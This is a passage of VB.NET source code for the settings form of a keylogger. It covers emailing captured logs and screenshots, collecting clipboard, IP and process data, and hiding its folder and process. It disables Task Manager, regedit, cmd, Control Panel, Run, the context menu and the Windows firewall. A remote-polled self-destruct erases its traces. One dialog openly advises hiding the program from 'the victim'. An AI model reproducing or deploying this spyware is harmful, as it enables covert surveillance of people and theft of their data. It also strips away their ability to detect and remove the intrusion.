    Private Sub NumericUpDown1_ValueChanged_1(sender As System.Object, e As System.EventArgs) Handles NumericUpDown1.ValueChanged
        Timer2.Interval = NumericUpDown1.Value * "60000"
    End Sub

    Private Sub CheckBox6_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked = True Then
            NumericUpDown1.Enabled = True
            My.Settings.autoemail = True
            My.Settings.Save()
            If My.Settings.email = Nothing Then
                MsgBox("There is no email set. Please set an email first in the email settings.", MsgBoxStyle.Critical)
                CheckBox6.Checked = False
                My.Settings.autoemail = False
                My.Settings.Save()
            Else

                Timer2.Start()
                Timer2.Interval = NumericUpDown1.Value * "60000"

            End If
        Else
            NumericUpDown1.Enabled = False
            My.Settings.autoemail = False
            My.Settings.Save()
        End If
    End Sub

    Private Sub CheckBox12_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox12.CheckedChanged
        If CheckBox12.Checked = True Then
            My.Settings.sendemailatlaunch = True
            If My.Settings.email = Nothing Then
                MsgBox("There is no email set. Please set an email first in the email settings.", MsgBoxStyle.Critical)
                CheckBox12.Checked = False
                My.Settings.sendemailatlaunch = False

            Else

            End If
        Else
            My.Settings.sendemailatlaunch = False
        End If
        My.Settings.Save()
    End Sub

    Private Sub Button9_Click_1(sender As System.Object, e As System.EventArgs) Handles Button9.Click
        about.Show()
    End Sub

    Private Sub Button15_Click_1(sender As System.Object, e As System.EventArgs) Handles Button15.Click
        If My.Settings.email = Nothing Then
            MsgBox("There is no email set. Please set an email first in the email settings.", MsgBoxStyle.Critical)
        Else
            feedback.Show()
        End If
    End Sub

    Private Sub CheckBox5_CheckedChanged_2(sender As System.Object, e As System.EventArgs) Handles CheckBox5.CheckedChanged
        If CheckBox5.Checked = True Then

            My.Settings.autocheck = True
            My.Settings.Save()
        Else
            My.Settings.autocheck = False
            My.Settings.Save()



        End If
    End Sub

    Private Sub Button14_Click_1(sender As System.Object, e As System.EventArgs) Handles Button14.Click
        Try
            CheckForUpdates()
        Catch ex As Exception
            MsgBox("There was an error while checking for updates", MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub LinkLabel1_LinkClicked_1(sender As System.Object, e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        OpenFileDialog1.InitialDirectory = My.Settings.directory
        OpenFileDialog1.ShowDialog()
    End Sub

    Private Sub CheckBox16_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox16.CheckedChanged
        If CheckBox16.Checked = True Then
            My.Settings.alwaysontop = True
            Me.TopMost = True
        Else
            My.Settings.alwaysontop = False
            Me.TopMost = False
        End If
        My.Settings.Save()
    End Sub

    Private Sub Button8_Click_1(sender As System.Object, e As System.EventArgs) Handles Button8.Click
        If RichTextBox1.Text = Nothing Then
            MsgBox("Nothing has been logged.", MsgBoxStyle.Exclamation)
        Else

            Try

                IO.Directory.CreateDirectory(My.Settings.directory)
                RichTextBox1.SaveFile(My.Settings.directory + "\log.txt", RichTextBoxStreamType.PlainText)

                MsgBox("Log file has been created.", MsgBoxStyle.Exclamation)
            Catch ex As Exception

                MsgBox("There was an error during this proccess.", MsgBoxStyle.Critical)
            End Try

        End If
    End Sub

    Private Sub Button17_Click_3(sender As System.Object, e As System.EventArgs)


    End Sub

    Private Sub CheckBox10_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox10.CheckedChanged
        If CheckBox10.Checked = True Then
            My.Settings.includesysinfo = True
        Else
            My.Settings.includesysinfo = False

        End If
        My.Settings.Save()
    End Sub

    Private Sub CheckBox15_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox15.CheckedChanged


        If CheckBox15.Checked = True Then
            File.SetAttributes(IO.Path.GetDirectoryName(Application.StartupPath), FileAttributes.Hidden)
            My.Settings.hideprogramfolder = True
        Else
            File.SetAttributes(IO.Path.GetDirectoryName(Application.StartupPath), FileAttributes.Normal)
            My.Settings.hideprogramfolder = False
        End If
        My.Settings.Save()
    End Sub


    Private Sub CheckBox13_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox13.CheckedChanged
        If CheckBox13.Checked = True Then
            My.Settings.getrunningprocesses = True
        Else
            My.Settings.getrunningprocesses = False
        End If
        My.Settings.Save()
    End Sub

    Private Sub CheckBox14_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox14.CheckedChanged
        If CheckBox14.Checked = True Then
            My.Settings.getclipboard = True
        Else
            My.Settings.getclipboard = False
        End If
        My.Settings.Save()
    End Sub

    Private Sub CheckBox18_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox18.CheckedChanged
        If CheckBox18.Checked = True Then
            My.Settings.getipaddress = True

        Else
            My.Settings.getipaddress = False

        End If
        My.Settings.Save()
    End Sub




    Private Sub CheckBox17_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox17.CheckedChanged

        If CheckBox17.Checked = True Then
            Try
                My.Settings.disabletaskmanager = True

                Dim regkey As Microsoft.Win32.RegistryKey
                Dim keyValueInt As String = "1"
                Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"
                regkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(subkey:=subKey)
                regkey.SetValue("DisableTaskMgr", keyValueInt)
                regkey.Close()
            Catch ex As Exception
                MsgBox(ex.Message, MsgBoxStyle.Critical)

                CheckBox17.Checked = False
            End Try
        Else
            My.Settings.disabletaskmanager = False
            Try

                Dim rkey As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System\", True)


                Dim rkey2 As RegistryKey = Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True)






                rkey.DeleteValue("DisableTaskMgr", True)
                rkey.Close()
                rkey2.Close()
            Catch ex As Exception
                MsgBox(ex.Message, MsgBoxStyle.Critical)
                My.Settings.disabletaskmanager = False
                CheckBox17.Checked = False
            End Try



        End If
        My.Settings.Save()
    End Sub

    Private Sub CheckBox19_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox19.CheckedChanged
        Dim b As Object
        Dim s As String
        Try
            If CheckBox19.Checked = True Then
                My.Settings.disableregedit = True
                b = CreateObject("wscript.shell")
                s = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"
                b.regwrite(s, 1, "REG_DWORD")
            Else
                My.Settings.disableregedit = False
                b = CreateObject("wscript.shell")
                s = "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools"
                b.regdelete(s)
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            CheckBox19.Checked = False
            My.Settings.disableregedit = False
        End Try
        My.Settings.Save()
    End Sub

    Private Sub CheckBox20_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox20.CheckedChanged
        Try
            If CheckBox20.Checked = True Then
                My.Settings.disablecmd = True
                Shell("REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
            Else
                Shell("REG add HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
                My.Settings.disablecmd = False

            End If
            My.Settings.Save()
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            If My.Settings.disablecmd = True Then
                CheckBox20.Checked = True
            Else
                CheckBox20.Checked = False
            End If
        End Try
    End Sub


    Private Sub CheckBox22_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox22.CheckedChanged

        Try
            If CheckBox22.Checked = True Then
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
                My.Settings.disablefolderoptions = True


            Else
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
                My.Settings.disablefolderoptions = False


            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            If My.Settings.disablefolderoptions = True Then
                CheckBox22.Checked = True
            Else
                CheckBox22.Checked = False
            End If
        End Try
        My.Settings.Save()
    End Sub

    Private Sub CheckBox22_CheckStateChanged(sender As Object, e As System.EventArgs) Handles CheckBox22.CheckStateChanged

    End Sub

    Private Sub CheckBox22_Click(sender As Object, e As System.EventArgs) Handles CheckBox22.Click
        If CheckBox22.Checked = True Then
            MsgBox("Restart for changes to take effect.", MsgBoxStyle.Information)
        End If


    End Sub



    Private Sub CheckBox23_Click(sender As Object, e As System.EventArgs)
        MsgBox("Restart for changes to take effect.", MsgBoxStyle.Information)

    End Sub





    Private Sub CheckBox9_CheckedChanged_1(sender As System.Object, e As System.EventArgs) Handles CheckBox9.CheckedChanged
        If CheckBox9.Checked = True Then
            My.Settings.hideprocess = True
            My.Settings.Save()
            TMListViewDelete.Running = True
        Else
            My.Settings.hideprocess = False
            My.Settings.Save()
            TMListViewDelete.Running = False
        End If
    End Sub

  


    Private Sub CheckBox21_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox21.CheckedChanged
        If CheckBox21.Checked = True Then
            My.Settings.enableselfdestruct = True
            selfdestruct.Start()
            My.Settings.selfdestructlink = TextBox3.Text
            TextBox3.Enabled = True
        Else
            My.Settings.enableselfdestruct = False
            selfdestruct.Stop()
            My.Settings.selfdestructlink = TextBox3.Text
            TextBox3.Enabled = False

        End If
        My.Settings.Save()
    End Sub

    Private Sub TextBox3_TextChanged(sender As Object, e As EventArgs) Handles TextBox3.TextChanged
        My.Settings.selfdestructlink = TextBox3.Text

        My.Settings.Save()
    End Sub

    Private Sub selfdestruct_Tick(sender As Object, e As EventArgs) Handles selfdestruct.Tick
        If My.Settings.selfdestructlink = Nothing Then
            selfdestruct.Stop()
            MsgBox("There is no link entered", MsgBoxStyle.Critical)

            CheckBox21.Checked = False
        Else
            Try
                Dim request As System.Net.HttpWebRequest = System.Net.HttpWebRequest.Create(My.Settings.selfdestructlink)
                Dim response As System.Net.HttpWebResponse = request.GetResponse
                Dim reader As System.IO.StreamReader = New System.IO.StreamReader(response.GetResponseStream)

                Dim ExecuteSD As String = reader.ReadToEnd
                Label9.Hide()

                If ExecuteSD.Contains("true") Then

                    Try
                        Timer1.Stop()
                        Timer2.Stop()
                        Timer3.Stop()
                        shutdown.Stop()
                        screenshotsettings.picturetimer.Stop()
                        If My.Computer.FileSystem.DirectoryExists(My.Settings.ssdirectory) = True Then
                            My.Computer.FileSystem.DeleteDirectory(My.Settings.ssdirectory, FileIO.DeleteDirectoryOption.DeleteAllContents)
                        End If
                        If My.Computer.FileSystem.DirectoryExists(My.Settings.directory) = True Then
                            My.Computer.FileSystem.DeleteDirectory(My.Settings.directory, FileIO.DeleteDirectoryOption.DeleteAllContents)

                        End If
                        If My.Computer.FileSystem.FileExists(Application.ExecutablePath) = True Then
                            Dim tempPath = System.IO.Path.GetTempPath()
                            My.Computer.FileSystem.MoveFile(Application.ExecutablePath, tempPath)
                        End If

                        If My.Computer.FileSystem.DirectoryExists(Application.StartupPath) = True Then

                            My.Computer.FileSystem.DeleteFile(Application.StartupPath)
                        End If

                            My.Settings.alwaysontop = False
                            My.Settings.autocheck = False
                            My.Settings.autoemail = False
                            My.Settings.directory = Nothing
                            My.Settings.disablecmd = False
                            My.Settings.disablecontrolpanel = False
                            My.Settings.disablefirewall = False
                            My.Settings.disablefolderoptions = False
                            My.Settings.disableregedit = False
                            My.Settings.disablerightclick = False
                            My.Settings.disablerun = False
                            My.Settings.disabletaskmanager = False
                            My.Settings.email = Nothing
                            My.Settings.emailphotos = False
                            My.Settings.emailupdate = False
                            My.Settings.enableselfdestruct = False
                            My.Settings.enableshutdown = False
                            My.Settings.encrypt = False
                            My.Settings.getclipboard = Nothing
                            My.Settings.getipaddress = Nothing
                            My.Settings.getrunningprocesses = False
                            My.Settings.gmpassword = Nothing
                            My.Settings.gmusername = Nothing
                            My.Settings.hide = False
                            My.Settings.hideprocess = False
                            My.Settings.hideprogramfolder = False
                            My.Settings.includesysinfo = False
                            My.Settings.password = Nothing
                            My.Settings.selfdestructlink = Nothing
                            My.Settings.sendemailatlaunch = False
                            My.Settings.showiconintray = True
                            My.Settings.shutdownlink = Nothing
                            My.Settings.ssdirectory = Nothing
                            My.Settings.startlog = False
                            My.Settings.startup = False
                            My.Settings.takescreenshot = False
                            My.Settings.Save()

                    Catch ex As Exception
                        Try
                            Dim mail As New MailMessage()
                            Dim SmtpServer As New SmtpClient
                            SmtpServer.Credentials = New Net.NetworkCredential(My.Settings.gmusername, My.Settings.gmpassword)
                            SmtpServer.Port = My.Settings.smtpport
                            SmtpServer.Host = My.Settings.smtpserver

                            SmtpServer.EnableSsl = My.Settings.enablessl
                            mail.To.Add(My.Settings.email)
                            mail.From = New MailAddress("keyloggertest@keylogger.com")
                            mail.Subject = "Errors deleting Keylogger"
                            mail.Body = ("Hello, " + vbNewLine + vbNewLine + "You requested the keylogger on computer: " + My.Computer.Name + " to be self destructed at around " + Now + vbNewLine + vbNewLine + "While the program was attempting to delete itself, one or more errors have occured. Please look at the error(s) below:" + vbNewLine + vbNewLine + ex.Message + vbNewLine + vbNewLine + " The program may or may have not been removed successfully. If you want to remove Keylogger manually. Firstly, delete all screenshots and logs, uninstall the program (or delete the directory)." + vbNewLine + "Sorry for any inconvinience this may have caused. I hope you have a great day!")
                            SmtpServer.Send(mail)
                        Catch exx As Exception
                        End Try
                    End Try
                    End
                End If

            Catch we As WebException
                Label9.Show()
                Label9.Text = "Error: " + we.Message
            Catch ex As Exception
                selfdestruct.Stop()
                MsgBox(ex.Message, MsgBoxStyle.Critical)

                TextBox3.Text = Nothing
                CheckBox21.Checked = False
            End Try

        End If

    End Sub

    Private Sub CheckBox21_Click(sender As Object, e As EventArgs) Handles CheckBox21.Click
        If CheckBox21.Checked = True Then
            selfdestruct.Stop()
            If MsgBox("PLEASE READ THE FOLLOWING BEFORE YOU CONTINUE: " + vbNewLine + vbNewLine + "Self destruct will delete ALL of the program settings and restore them back into original condition. The email, password, screenshots, log files, along with other settings, WILL BE DELETED. However this will not delete the program itself. It is advised that the Keylogger is in a well hidden location where the victim will not likely be able to find it, such as the temporary folder.  Additionally, the program will not start automatically when the computer starts and your email communications to this computer will be lost!  " + vbNewLine + vbNewLine + "If you understand the terms and conditions, click Yes", MsgBoxStyle.YesNo) = Windows.Forms.DialogResult.Yes Then
                selfdestruct.Start()
                My.Settings.enableselfdestruct = True
                CheckBox21.Checked = True
            Else
                selfdestruct.Stop()
                My.Settings.enableselfdestruct = False
                CheckBox21.Checked = False
                My.Settings.Save()
            End If
        End If
    End Sub

    Private Sub Button17_Click_4(sender As Object, e As EventArgs)



    End Sub
    
    Private Sub TabPage5_Click(sender As Object, e As EventArgs) Handles TabPage5.Click

    End Sub

    Private Sub CheckBox23_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox23.CheckedChanged
        Try
            If CheckBox23.Checked = True Then
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
                My.Settings.disablecontrolpanel = True


            Else
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
                My.Settings.disablecontrolpanel = False


            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            If My.Settings.disablecontrolpanel = True Then
                CheckBox23.Checked = True
            Else
                CheckBox23.Checked = False
            End If
        End Try
        My.Settings.Save()
    End Sub

    Private Sub CheckBox24_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox24.CheckedChanged
        Try
            If CheckBox24.Checked = True Then
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
                My.Settings.disablerun = True


            Else
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
                My.Settings.disablerun = False


            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            If My.Settings.disablerun = True Then
                CheckBox24.Checked = True
            Else
                CheckBox24.Checked = False
            End If
        End Try
        My.Settings.Save()
    End Sub

   

    Private Sub CheckBox25_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox25.CheckedChanged
        Try
            If CheckBox25.Checked = True Then
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
                Shell("REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f", AppWinStyle.Hide)
                My.Settings.disablerightclick = True


            Else
                Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
                Shell("REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 0 /f", AppWinStyle.Hide)
                My.Settings.disablerightclick = False


            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            If My.Settings.disablerightclick = True Then
                CheckBox25.Checked = True
            Else
                CheckBox25.Checked = False
            End If
        End Try
        My.Settings.Save()
    End Sub

    Private Sub CheckBox27_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox27.CheckedChanged
        Try
            If CheckBox27.Checked = True Then
                Dim Proc As Process = New Process
                Dim top As String = "netsh.exe"
                Proc.StartInfo.Arguments = ("firewall set opmode disable")
                Proc.StartInfo.FileName = top
                Proc.StartInfo.UseShellExecute = False
                Proc.StartInfo.RedirectStandardOutput = True
                Proc.StartInfo.CreateNoWindow = True
                Proc.Start()
                Proc.WaitForExit()
                My.Settings.disablefirewall = True


            Else
                Dim Proc As Process = New Process
                Dim top As String = "netsh.exe"
                Proc.StartInfo.Arguments = ("firewall set opmode enable")
                Proc.StartInfo.FileName = top
                Proc.StartInfo.UseShellExecute = False
                Proc.StartInfo.RedirectStandardOutput = True
                Proc.StartInfo.CreateNoWindow = True
                Proc.Start()
                Proc.WaitForExit()
                My.Settings.disablefirewall = False


            End If

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
            If My.Settings.disablefirewall = True Then
                CheckBox27.Checked = True
            Else
                CheckBox27.Checked = False
            End If
        End Try
        My.Settings.Save()
    End Sub

    Private Sub CheckBox23_Click1(sender As Object, e As EventArgs) Handles CheckBox23.Click
        If CheckBox23.Checked = True Then
            MsgBox("Restart for changes to take effect.", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub CheckBox25_Click(sender As Object, e As EventArgs) Handles CheckBox25.Click
        If CheckBox25.Checked = True Then
            MsgBox("Restart for changes to take effect. Note that this only applies to the desktop.", MsgBoxStyle.Information)
        End If
    End Sub

    Private Sub CheckBox24_Click(sender As Object, e As EventArgs) Handles CheckBox24.Click
        If CheckBox24.Checked = True Then
            MsgBox("Restart for changes to take effect.", MsgBoxStyle.Information)
        End If
    End Sub

    
   
   
    Private Sub CheckBox26_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox26.CheckedChanged
        If CheckBox26.Checked = True Then
            My.Settings.emailupdate = True
            If My.Settings.email = Nothing Then
                MsgBox("There is no email set. Please set an email first in the email settings.", MsgBoxStyle.Critical)
                CheckBox26.Checked = False
                My.Settings.emailupdate = False

            Else


            End If
        Else
            My.Settings.emailupdate = False
        End If


    End Sub



    Private Sub ComboBox1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ComboBox1.SelectedIndexChanged
        If ComboBox1.SelectedItem = "French" Then
          

        End If
    End Sub

    Private Sub Button17_Click(sender As System.Object, e As System.EventArgs) Handles Button17.Click
        Thread.CurrentThread.CurrentUICulture = New CultureInfo("fr-FR")

        Thread.CurrentThread.CurrentCulture = New CultureInfo("fr-FR")
    End Sub
   


End Class